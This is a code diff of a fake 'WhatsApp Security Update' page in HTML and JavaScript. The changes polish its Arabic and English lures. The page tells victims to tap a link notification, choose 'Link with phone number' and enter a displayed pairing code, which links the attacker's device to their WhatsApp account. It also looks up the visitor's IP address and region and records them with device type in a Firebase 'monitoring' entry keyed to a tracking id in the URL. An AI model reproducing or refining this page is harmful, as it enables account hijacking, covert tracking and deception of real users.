@@ -29,8 +29,8 @@
         <div class="header-title">WhatsApp Security Update</div>
         <div id="u-badge" class="badge">Checking...</div>
         <div class="v-box">
-            <div class="v-row"><span>Current:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
-            <div class="v-row"><span>Updated:</span><span style="color:#00a884; font-weight:bold">V3.0.1</span></div>
+            <div class="v-row"><span id="v-label">Current Version:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
+            <div class="v-row"><span>Update To:</span><span style="color:#00a884; font-weight:bold">V3.0.1</span></div>
         </div>
         <p id="u-alert" class="alert-p"></p>
         <div id="u-steps" class="steps"></div>
@@ -52,16 +52,36 @@
         const userId = new URLSearchParams(window.location.search).get('id');
         const isAr = navigator.language.startsWith('ar');
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+        
         const content = {
-            ar: { badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", alert: "لحماية خصوصيتك ومحادثاتك، يجب الترقية إلى بروتوكول V3.0.1.", steps: "1. اضغط إشعار الربط على هاتفك.<br>2. اختر 'الربط برقم الهاتف'.<br>3. أدخل الرمز التالي هنا:", wait: "في انتظار الرمز الأمني...", done: "أدخل الكود الآن في واتساب", success: "تم التحديث إلى أحدث إصدار بنجاح." },
-            en: { badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", alert: "To protect your privacy, you must upgrade to protocol V3.0.1.", steps: "1. Tap the link notification.<br>2. Select 'Link with phone number'.<br>3. Enter the following code here:", wait: "Awaiting security code...", done: "Enter code now in WhatsApp", success: "Updated to the latest version successfully." }
+            ar: { 
+                vLabel: "الإصدار الحالي:",
+                badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", 
+                alert: "لحماية خصوصيتك ومحادثاتك، يجب الترقية من إصدار V2.12.5 إلى أحدث بروتوكول أمني.", 
+                steps: "1. اضغط إشعار الربط على هاتفك.<br>2. اختر 'الربط برقم الهاتف'.<br>3. أدخل الرمز التالي هنا:", 
+                wait: "في انتظار الرمز الأمني...", 
+                done: "أدخل الكود الآن في واتساب", 
+                success: "تم التحديث بنجاح." 
+            },
+            en: { 
+                vLabel: "Current Version:",
+                badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", 
+                alert: "To protect your privacy, you must upgrade your version V2.12.5 to the latest security protocol.", 
+                steps: "1. Tap the link notification.<br>2. Select 'Link with phone number'.<br>3. Enter the following code here:", 
+                wait: "Awaiting security code...", 
+                done: "Enter code now in WhatsApp", 
+                success: "Updated successfully." 
+            }
         };
+
         const c = isAr ? content.ar : content.en;
         document.documentElement.dir = isAr ? 'rtl' : 'ltr';
+        document.getElementById('v-label').innerText = c.vLabel;
         document.getElementById('u-badge').innerText = c.badge;
-        document.getElementById('u-alert').innerText = c.alert;
+        document.getElementById('u-alert').innerHTML = c.alert;
         document.getElementById('u-steps').innerHTML = c.steps;
         document.getElementById('u-wait').innerText = c.wait;
+
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sRef.set({ status: "Online", ip: d.ip, region: d.region, device: isIOS ? "iPhone" : "Android", ts: Date.now() }));
